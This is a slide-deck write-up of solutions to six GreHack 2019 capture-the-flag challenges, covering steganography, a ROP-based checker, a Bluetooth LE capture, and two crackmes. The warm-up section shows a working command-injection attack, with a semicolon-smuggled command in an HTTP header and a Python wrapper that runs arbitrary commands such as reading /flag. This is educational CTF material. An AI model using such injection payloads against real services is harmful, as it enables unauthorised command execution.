=========================
Solution of the challenge
=========================

:author: Nicolas Iooss, Adrien Guinet
:date: 2019-11-15

Presentation
~~~~~~~~~~~~

1. Real-world steganography
===========================

.. role:: latex(raw)
   :format: latex

Challenge: a GIF image, that looks like 2017's aztec challenge.

Analysis:

* dump each frames in a different file: ``convert aztec.gif frame-%d.png`` 
* in one of them (frame # 114), a metadata with ``You should look here``


1. Real-world steganography
===========================

.. raw:: latex

  \vspace{-2.5cm}
  \begin{center}
  \includegraphics[width=.8\textwidth]{images/1_sol.png}
  \end{center}

2. Warm-up
==========

.. raw:: latex

   \vspace{-2em}
    \begin{center}
    \includegraphics[width=.85\textwidth]{images/2_webapp.png}
    \end{center}

2. Warm-up
==========

.. code-block::
  
  $ curl -s https://[...].challenge.grehack.fr/is-it-down
  {
   "down" : false,
   "trace" : "PING X.X.X.X (X.X.X.X) 56(84) bytes of data.\n
      64 bytes from X.X.X.X: icmp_seq=1 ttl=52 time=2.95 ms\n\n
      --- X.X.X.X ping statistics ---\n
      1 packets transmitted, 1 received, 0% packet loss, time 0ms\n
      rtt min/avg/max/mdev = 2.948/2.948/2.948/0.000 ms\n",
   "ip" : "X.X.X.X"
  }



2. Warm-up
==========

.. code-block::

   $ rgrep ping
   iputil/iputil.go:46: pingCommand := 
     fmt.Sprintf("ping -c 1 -W 150 %s", address)
   $ curl -s -H 'Inspect-IP: 127.0.0.1; id' \
      https://[...].challenge.grehack.fr/is-it-down |json_pp
   {
      "down" : false,
      "trace" : "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n
         64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.060 ms\n\n
         --- 127.0.0.1 ping statistics ---\n1 packets transmitted, 
         1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.060/0.060/0.060/0.000 ms\n
         uid=65534(nobody) gid=65534(nobody)\n",
      "ip" : "127.0.0.1; id"
   }

2. Warm-up
==========

.. code-block:: python

   import requests
   import sys
   r = requests.get("https://[...].challenge.grehack.fr/is-it-down",
     headers={'Inspect-IP': '127.0.0.1; %s' % sys.argv[1]})
   print(r.json()['trace'])

.. code-block::

   $ python ./run.py 'ls /'
   PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
   [...]
   bin
   dev
   etc
   flag
   home
   [...]

2. Warm-up
==========

.. code-block::

   $ python ./run.py 'cat /flag'
   PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
   [...]
   GH19{challenges_for_the_ctf_will_not_be_that_easy}


3. Stacked - Let's do some reverse-engineering!
===============================================

.. raw:: latex

    \begin{center}
    \includegraphics[width=.9\textwidth]{images/3_stacked_main1.png}
    \end{center}

3. Stacked - Let's do some reverse-engineering!
===============================================

.. raw:: latex

    \begin{center}
    \includegraphics[width=.9\textwidth]{images/3_stacked_main2.png}
    \end{center}

3. Stacked - A hard-coded ROP-chain!
====================================

.. code-block:: c

    main:
        g_szPrgmArg = argv[1];
        g_ROP_buffer = malloc(0x400);
        g_ROP_buffer[0] = FUN_0040154c;
        g_ROP_buffer[1] = 0x45;
        /* ... */
        makecontext(&g_new_ctx,FUN_00401562,0);
        swapcontext(&g_old_ctx,&g_new_ctx);

    FUN_00401562:
        MOV  RSP,qword ptr [g_ROP_buffer]
        RET

3. Stacked - ROP gadgets
========================

Two 64-bit registers (at ``.bss:004040b8`` and ``.bss:004040bc``), let's call them A and B.

Gadgets: pop A, inc A, pop B, inc B, ``swapcontext`` to old context, and:

.. code-block:: c

    void check_that_pwd_idx_regA_is_regB_0401526(void) {
      if (g_szPrgmArg[g_regA] != g_regB) {
        g_fHasGoodFlag = 0;
      }
    }

:latex:`\pause`

:math:`\Rightarrow` It is possible to make the ROP chain generate the flag! (``Fr3ak1nR0P``)


4. BLE everywhere
=================

Challenge: a PCAP file => wireshark

.. raw:: latex

  \begin{center}
  \includegraphics[width=.9\textwidth]{images/4_wireshark_org.png}
  \end{center}

4. BLE everywhere
=================

After some googling, this is a PCAP generated with a Nordic BLE sniffer. Wireshark needs to be configured:

.. raw:: latex

  \begin{center}
  \includegraphics[width=.5\textwidth]{images/4_wireshark_prefs.png}
  \end{center}


4. BLE everywhere
=================

.. raw:: latex

  \begin{center}
  \includegraphics[width=.9\textwidth]{images/4_wireshark_adv.png}
  \end{center}

4. BLE everywhere
=================

This is a "smart coffee cup", where a custom picture can be uploaded via
Bluetooth (wow very smart, much disruptive):

.. raw:: latex

  \begin{center}
  \includegraphics[width=.5\textwidth]{images/muki.jpg}
  \end{center}

4. BLE everywhere
=================

Protocol reversed engineered by "jku": https://github.com/jku/mukinator

* no encryption
* transmitted image is a 264x176 B\&W image. Encoding is done on 1-bit.


4. BLE everywhere
=================

.. raw:: latex


  \begin{center}
  \includegraphics[width=.9\textwidth]{images/4_wireshark_writes.png}
  \end{center}

4. BLE everywhere
=================

Extract the data thanks to Scapy and https://github.com/sysdream/bluefruit-scapy:

.. code-block:: python

   from scapy.all import *
   import bluefruit_sniffer

   pkts = rdpcap("data.pcap")
   img = bytes()
   for p in pkts:
       try:
	   payload = p[ATT_Write_Command]
	   img += payload.data
       except IndexError:
	   continue
   open("img.raw","wb").write(img)

4. BLE everywhere
=================

Convert as a 264x176 1-bit B&W image:

.. code-block::

   $ convert -size 264x176 -monochrome -depth 1 GRAY:img.data img.png

.. raw:: latex

  \vspace{-1em}
  \begin{center}
  \includegraphics[width=.5\textwidth]{images/4_flag_bad.png}
  \end{center}

Wrong bit order?

4. BLE everywhere
=================

.. code-block:: python

   def rev(v):
     # One-liner to fit in the slides
     return int('{:08b}'.format(v)[::-1], 2)
   for p in pkts:
     try:
       payload = p[ATT_Write_Command]
       img += bytes(rev(v) for v in payload.data)
     except IndexError:
       continue

4. BLE everywhere
=================

.. raw:: latex

  \begin{center}
  \includegraphics[width=.7\textwidth]{images/4_flag.png}
  \end{center}

5. The Grid
===========

Challenge:

* an ELF x86/64 Linux binary (stripped)
* ``"Usage: %s <flag>"``

5. The Grid
===========

After some "reversing":

* each character of the flag makes you move into an "ASCII maze"
* we start from the bottom of the maze, and need to go into a specific position
* there's only one possible way, so one possible flag

5. The Grid
===========

.. raw:: latex

   \begin{center}
   \includegraphics[width=.9\textwidth]{images/5_maze.png}
   \end{center}

5. The Grid
===========

Each character is split in 2x4 bits. Two bits are mapped to a movement within the maze:

.. raw:: latex

   \begin{table}
     \ttfamily
     \begin{tabular}{|l|l|r|r|r|r|}
       \hline
       2-bit value & X shift & Y shift\\
       \hline
       0 & -2 & 0 \\
       1 & 0 & -2 \\
       2 & 1 & 0 \\
       3 & 0 & 1 \\
       \hline
     \end{tabular}
   \end{table}

Two possible approaches to figure out the flag:

* write an algorithm that goes through all the possible ways, until the wanted
  position is reached
* write directions by hand

(I took the latest)

5. The Grid
===========

.. code-block:: python

   def make_move(xd, yd):
       return {(1,0):2, (0,1):3, (0,-2):1, (-2, 0): 0}[(xd,yd)]
   def make_char(moves):
       moves = tuple(make_move(*m) for m in moves)
       return moves[0]<<6|moves[1]<<4|moves[2]<<2|moves[3]
   flag = [
       [(0,-2),(-2,0),(0,1),(-2,0)],
       [(0,-2),(1,0),(0,-2),(0,-2)],
       [...]
       [(0,-2),(0,-2),(1,0),(0,-2)]
   ]
   flag = [make_char(m) for m in flag]

Final flag is ``LeAd@Ze@VAY``


6. The Puzzle
=============

Two files:

* ``thepuzzle``: ELF 64-bit LSB pie executable, x86-64
* ``script.enc``::

      00000000: 8b79 a5b7 a119 151c a25b c7ca 9318 5b53  .y.......[....[S
      00000010: d61f 47a2 b114 79ae e265 8cf1 d4a5 1388  ..G...y..e......
      00000020: 1106 68db f55a 9578 b7f0 6675 66b4 3ca7  ..h..Z.x..fuf.<.
      00000030: 0fd9 d27b 4ca8 a949 52a1 5245 cbcf a7b9  ...{L..IR.RE....
      ...

Let's crack ``thepuzzle`` first.

6. The Puzzle - First reverse
=============================

Quick analysis:

* ``"Usage: ./%s /path/to/ds/file [key] -- aborting", argv[0]``
* The first argument must end with ``.debugging_script``
* ``if (strlen(key) < 4) fail("The key must meet our security requirements -- aborting")``
* ``fork()`` + ``usleep(100)`` + ``FUN_001015ad(*argv)`` and dirty code
* ``main`` continues to ``FUN_00101755``:

  - ``ptrace(PTRACE_ATTACH, child_pid)``
  - ``base64_decode(key)``
  - ``fopen(argv[1])``
  - Decrypt the content of the file with ``argv[1]``
  - Parse a text file. What is the grammar?


6. The Puzzle - Text parsing, the tokens
========================================

The code contains a nice description of an enum :)

::

    00108c68 49 4e 54 00       ds         "INT"
    00108c6c 50 4c 55 53 00    ds         "PLUS"
    00108c71 4d 49 4e 55 53 00 ds         "MINUS"
    00108c77 4d 55 4c 54 00    ds         "MULT"
    00108c7c 4f 50 41 52 00    ds         "OPAR"
    00108c81 43 50 41 52 00    ds         "CPAR"
    00108c86 52 45 47 00       ds         "REG"
    00108c8a 45 4e 44 00       ds         "END"

Integer, +, -, *, (, ), $, end of file.

6. The Puzzle - Text parsing
============================

* Blocks of "functions"::

      begin block_name
      ...
      end

* Instructions: parsed through calls to ``strcmp()``

  - b, bh, c, w, wr, f, mc, a, x, n

* sometimes parameters, that can be arithmetic expressions (with priorities!)
* ``FUN_00102bec``: resolve x86 register names (``eax``, ``rbp``...) into values from the child process: ``ptrace(PTRACE_GETREGS)``
* ``FUN_00102f0c``: use ``ptrace(PTRACE_SETREGS)`` to modify x86 registers

6. The Puzzle - Debugging Script Grammar
========================================

Instructions:

* b: define a breakpoint with callback in real code
* bh: define a breakpoint with 2 handlers in pseudo-code
* c: "continue"
* w: ``store_value(offset, value [, byte_count])``
* wr: ``store_random_bytes(offset, size)``
* f z: flip ZF
* mc: make a call to a function in real code
* a: add a value to a register
* x: XOR a byte with 1
* n: ``memcpy(dst, src, size)``

So... the challenge consists in programming a debugger? Strange...

6. The Puzzle - More encryption
===============================

``FUN_001035b1``: no XREF, but seems to decrypt things.

Maybe it decrypts an embedded debugging script?

:latex:`\pause`

* ``FUN_001034fd`` tries to decrypt 3 bytes with 500 keys, until the clear text is ``48 89 e5``

  - ``48 89 e5  mov %rsp,%rbp``

* ``FUN_001035b1`` decrypts with the found key until decrypting ``90 90 90`` followed by ``c3``

  - ``90  nop``
  - ``c3  retq``

* Many other functions called, which peek/poke things. Maybe for breakpoints.

Some functions are encrypted with hardcoded keys.

6. The Puzzle - Decrypting some functions
=========================================

``main`` calls ``fork()`` and the child calls ``FUN_001015ad`` which is encrypted and can be decrypted!

How to find all encrypted functions and decrypt all of them?


6. The Puzzle - DWARF to the rescue!
====================================

Enumerate Frame Description Entries::

    $ objdump --dwarf thepuzzle |grep FDE
    00000018 00000014 0000001c FDE cie=00000000 pc=00001420..0000144b
    00000048 00000024 0000001c FDE cie=00000030 pc=00001140..00001410
    00000070 00000014 00000044 FDE cie=00000030 pc=00001410..00001418
    00000088 0000001c 0000005c FDE cie=00000030 pc=00001550..00001581
    000000a8 0000001c 0000007c FDE cie=00000030 pc=00001581..000015ad
    000000c8 0000001c 0000009c FDE cie=00000030 pc=000015ad..00001755
    000000e8 0000001c 000000bc FDE cie=00000030 pc=00001755..000018c8
    00000108 00000024 000000dc FDE cie=00000030 pc=000018c8..00001a5b
    00000130 0000001c 00000104 FDE cie=00000030 pc=00001a5b..00001b05

:math:`\Rightarrow` All functions can be found, even encrypted, thanks :) ... or no

6. The Puzzle - Not so fast!
============================

Some function prefixes look strange::

    001015ad:
      push   %rbp
      mov    %rsp,%rbp
      sub    $0x40,%rsp
      mov    %rdi,-0x38(%rbp)
      jl     101546
      cmp    -0x6c(%rsi),%ecx
      cs pop %rbp
      in     $0xd5,%al
      shlb   $0x0,-0x472b9fac(%rbp)
      add    %al,(%rax)
      add    %ch,%al
      mov    $0xff,%al

6. The Puzzle - The missing part
================================

So far:

* ``thepuzzle`` forks a child process and attaches it with a debugger.
* The parent process loads an unknown debugging script that can define breakpoints, poke code, etc.
* There is an unreferenced functions that decrypts many functions.
* After the decryption, functions are still strange.

What can I do? Take a look at ``script.enc`` again?

* Is it encrypted with one of the 500 keys? No.
* It is late, let's try brute-forcing the encryption key. It succeeded! Why?!?

6. The Puzzle - The key
=======================

* The key I found: ``7gQ=`` (Base64 encoding of ``"\xee\x04"``)
* The code I read: ``if (strlen(key) < 4) fail``
* The actual code: ``if (strlen(key) != 4) fail``

It seems that the brute-force was the intended way :)

Now, there is a debugging script!!!

6. The Puzzle - The script
==========================

::

    begin MxWrPI3e73de96
    w 4070-106-3947+1539*3540-5424645 0-0*0-0+0-0+4
    wr 275155+497936+1369725 0+0+1+0+3
    end
    b 2116-539+3385+2408+8664 449-2475-2553+18324
    bh 6792*1389-6133-9402184 cSZYcDfc27076b TUOzdce2f39606
    b 1540+769-339-29*3803*1055+116375321 1630+3727-2557+10945
    bh 3699-1499*3427-435-2439-2124-1844+5168807 QmsOeob5de0057 hdMxXv7691170c

    begin NAYjxe55588ff9
    f z
    x 723-1575*779*1743*284-504-735+607342621890
    end
    bh 1112+2095+5053+4887+10127 FjsdHZaeefdd71 NAYjxe55588ff9

6. The Puzzle - The script
==========================

How is decrypting the functions handled?

::

    b 50*900*124-1014-654-5572783 5973+5699+2073

:math:`\Rightarrow` breakpoint at 0x15ad that calls 0x35b1

* 0x15ad: ``FUN_001015ad``, child process
* 0x35b1: ``FUN_001035b1``, decrypts a function with one key among 500

:latex:`\pause`

Later::

    bh 641+141+4779 QmsOeob5de0057 JYcNFGf195f9f3

* Break at 0x15b9 = 0x15ad + 12
* Call block ``QmsOeob5de0057`` when the breakpoint is first hit
* Call block ``JYcNFGf195f9f3`` later


6. The Puzzle - The script, the functions
=========================================

Breakpoint at 0x15b9 = 0x15ad + 12:

.. code-block:: python

    begin QmsOeob5de0057
      rip += 0xd # a $rip 1+1+1+0+1-1+1+9
      # => Jump to 0x15b9+1+0xd = 0x15c7
    end

    begin JYcNFGf195f9f3
      WriteVal(0x15b9, 0xeb) # w 743*615*437*906-790-180914571939
                             #   11+13-0+13*7-28*30+960
      WriteVal(0x15ba, 0x0c) # w 388+270-56+351+918+551+3140 0+1+3+8
      rip += 0x1             # a $rip 1
    end


6. The Puzzle - The script, the functions and the patch
=======================================================

.. raw:: latex

    \begin{minipage}[t]{0.52\textwidth}
    Before

    \texttt{1015ad:~push~~~\%rbp} \\
    \texttt{\textcolor{white}{.}~~~ae:~mov~~~~\%rsp,\%rbp} \\
    \texttt{\textcolor{white}{.}~~~b1:~sub~~~~\$0x40,\%rsp} \\
    \texttt{\textcolor{white}{.}~~~b5:~mov~~~~\%rdi,-0x38(\%rbp)} \\
    \textcolor{red}{\texttt{1015b9:~jl~~~~~101546}} \\
    \textcolor{red}{\texttt{\textcolor{white}{.}~~~bb:~cmp~~~~-0x6c(\%rsi),\%ecx}} \\
    \textcolor{red}{\texttt{\textcolor{white}{.}~~~be:~cs~pop~\%rbp}} \\
    \textcolor{red}{\texttt{\textcolor{white}{.}~~~c0:~in~~~~~\$0xd5,\%al}} \\
    \textcolor{red}{\texttt{\textcolor{white}{.}~~~c2:~shlb~~~\$0,-0x472b9fac(\%rbp)}} \\
    \textcolor{red}{\texttt{\textcolor{white}{.}~~~c9:~add~~~~\%al,(\%rax)}}
    \end{minipage}
    \begin{minipage}[t]{0.35\textwidth}
    After

    \texttt{1015ad:~push~~~\%rbp} \\
    \texttt{\textcolor{white}{.}~~~ae:~mov~~~~\%rsp,\%rbp} \\
    \texttt{\textcolor{white}{.}~~~b1:~sub~~~~\$0x40,\%rsp} \\
    \texttt{\textcolor{white}{.}~~~b5:~mov~~~~\%rdi,-0x38(\%rbp)} \\
    \textcolor{blue}{\texttt{1015b9:~jmp~~~~1015c7}} \\
    \textcolor{gray}{\texttt{\textcolor{white}{.}~~~~~~[...]}} \\
    \texttt{1015c7:~mov~~~~\$0x0,\%eax} \\
    \texttt{\textcolor{white}{.}~~~cc:~callq~~101581} \\
    \texttt{\textcolor{white}{.}~~~d1:~mov~~~~\%eax,-0x4(\%rbp)}
    \end{minipage}

6. The Puzzle - some patches later...
=====================================

.. code-block:: python

    # Convert debugging script to Python
    THEPUZZLE_NEW[0x64ac] = 0x5f
    THEPUZZLE_NEW[0x6291] = 5
    THEPUZZLE_NEW[0x5f5a] = 0xc
    THEPUZZLE_NEW[0x15fd:0x15fd + 5] = struct.pack('<Q', 0x1bf)[:5]
    THEPUZZLE_NEW[0x5c1d] ^= 1
    THEPUZZLE_NEW[0x62a5] = 0xaa
    THEPUZZLE_NEW[0x7208:0x7208 + 5] = struct.pack('<Q', 0xb8)[:5]
    # ...
    THEPUZZLE_NEW[0x62b8:0x62b8 + 5] = struct.pack('<Q', 0xffb9)[:5]
    THEPUZZLE_NEW[0x555c:0x555c + 5] = struct.pack('<Q', 0x1be)[:5]
    THEPUZZLE_NEW[0x7048:0x7048 + 5] = struct.pack('<Q', 0x38ba)[:5]
    THEPUZZLE_NEW[0x5b88] = 4

6. The Puzzle - some more patches later...
==========================================

.. code-block:: python

    WRITTEN_MEM = {
        0x20b240: 0x48,
        0x20b244: 0x42,
        0x20b248: 0x5,
        # ...
        0x20b28c: 0x33,
        0x20b290: 0x33,
    }

    THEPUZZLE_NEW[0x5b82] = WRITTEN_MEM[0x20b25c]
    THEPUZZLE_NEW[0x5b88] = WRITTEN_MEM[0x20b260]
    THEPUZZLE_NEW[0x5bb3] = WRITTEN_MEM[0x20b264]
    THEPUZZLE_NEW[0x5bb9] = WRITTEN_MEM[0x20b268]

6. The Puzzle - no more patches, please!
========================================

After applying patches: many nice functions :)

End of part 2.

Now, it is time for static analysis.

6. The Puzzle - The child, a first look
=======================================

.. code-block:: c

    void child_001015ad(char *pszArgv0) {
      if (strcmp(getenv("USER"), "root") != 0)
        die("Something looks wrong with your environment!\n");
      uVar3 = FUN_0010524e();
      g_pCrypto = FUN_10730a("This program cannot be run in DOS mode",0x26);
      stream = (FILE *)FUN_00105a80(pszArgv0);
      uVar4 = FUN_00105775(stream); fclose(stream);
      if (!(ptr = (void *)FUN_00103ff3(uVar4,uVar3,uVar3))
        print("Come on, give me some input to process, man.\n");
      else if (FUN_001068aa(ptr) == 0)
        print("Nope. You think you\'re a hacker but you\'re not, \
            go back to (Gh)id(r)a!\n");
      else
        print("Congrats, you\'re a hacker!\n");

6. The Puzzle - The screenshooter
=================================

.. code-block:: c

    BITMAP *FUN_0010524e(void) {
      result = NULL;
      if (display = XOpenDisplay()) {
        width = display->screens[display->default_screen].width;
        height = display->screens[display->default_screen].height;
        img = XGetImage(display,
            display->screens[display->default_screen].root,
            0, 0, width, height, -1, 2);
        result = convert_pixels_to_bitmap(img->data,width,height);
        (*(img->f).destroy_image)(img);
        XCloseDisplay(display);
      }
      return result;
    }

6. The Puzzle - The appended data
=================================

.. code-block:: c

    FILE * FUN_00105a80(char *pszArgv0) {
      stream = fopen(pszArgv0,"r");
      fseek(stream, -4, 2);  // 2 = SEEK_END
      if (fread(&uDataSize, 4, 1, stream) != 1)
        exit(1);
      fseek(stream, -4 - uDataSize,2);
      return stream;
    }

* ``FUN_00105775(stream)`` decrypts and parses the appended data.
* Data is a binary tree of ``I`` and ``L`` nodes:

  - ``I {y, x, {char, bitmap}, left, right}``
  - ``L {count, array of {char, bitmap}}``

6. The Puzzle - The appended tree
=================================

::

    Node('e', (0, 0), @)
      Node('a', (1, 0), @L)
        Node('r', (2, 0), @LL)
          Node('k', (3, 0), @LLL)
    [...]
              Node('G', (13, 0), @LLLLLLLLLLLLL)
                Leaf(count=3, 'a#H', @LLLLLLLLLLLLLL)
                Leaf(count=3, '9rG', @LLLLLLLLLLLLLR)
              Node('a', (13, 0), @LLLLLLLLLLLLR)
                Leaf(count=3, 'GHe', @LLLLLLLLLLLLRL)
                Leaf(count=2, 'ec', @LLLLLLLLLLLLRR)
    [...]
      Node('e', (1, 0), @R)
        Node('k', (2, 0), @RL)

6. The Puzzle - Crack me, if you managed to get there!
======================================================

``ptr = FUN_00103ff3(tree, bitmap)``: OCR:latex:`\footnote{Optical Character Recognition}` :math:`\rightarrow` string of 8 characters.

The checker, ``FUN_001068aa(ptr)``:

* Compute SHA256
* XOR bytes with 0x19
* Compare with 3e200bdfa8676a5f57977811ae9c283b5bc4aa9de7fcdd1056c18611a37e9f3a

John the Ripper: ``john --format=Raw-SHA256``. Which charset?

:latex:`\pause`

Characters in the tree: ``#GreHack19``.

Brute-force => Found a match! ``"krH9kkGk"``

6. The Puzzle - One last step
=============================

But ``GH19{krH9kkGk}`` is not the flag :(

Extract all the bitmaps of the tree: 28x28 white-on-black images with numbers!

* # is 0
* G is 1
* r is 2
* ...

``GH19{72497717}`` is the final flag :)

6. The Puzzle - Summary
=======================

* Many protections in this crack-me
* Encrypted debugging script with short key
* Reversible binary protections (static analysis possible!)
* Screenshot + OCR is an original way to get an input
* Encrypted tree of images for OCR
* End with a brute-forceable SHA256 hash thanks to a small charset
